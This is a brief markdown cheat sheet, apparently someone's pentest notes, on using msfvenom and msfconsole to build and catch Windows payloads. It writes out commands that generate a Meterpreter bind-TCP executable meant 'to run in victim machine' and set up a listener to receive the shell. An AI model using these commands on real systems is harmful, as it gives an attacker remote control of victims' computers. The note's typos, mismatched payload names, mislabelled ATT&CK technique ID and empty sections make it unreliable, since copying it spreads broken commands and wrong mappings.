# MSFVenom

## Usage
   - Payload generator and shellcode encoder

## ATT&CK
   - Execution
     - Exploitation for Client Execution (T1023) 
   - Privilege Escalation
     - Exploitation for Privilege Escalation (T1068)
  
## Link
   - https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom

## Commands
   - Client Execution
     - ```msfvenom --list payload | grtep windows```
       - list of windows payloads 
     - ```msfvenom -p windows/meterpreter_bind_tcp -a x86 -f exe -o bind.exe --platform windows```
       - Create a malicious exe to run in victim machine
     - ```msfconsole``` & ```set PAYLAOD windows/meterpreter_bin_tcp``` & ```set LPORT 4444``` & ```set LHOST 192.168.1.1```
       - Receive the shell in attacker machine 
   - Options
     - 
   - Privilege Escalation
     - 
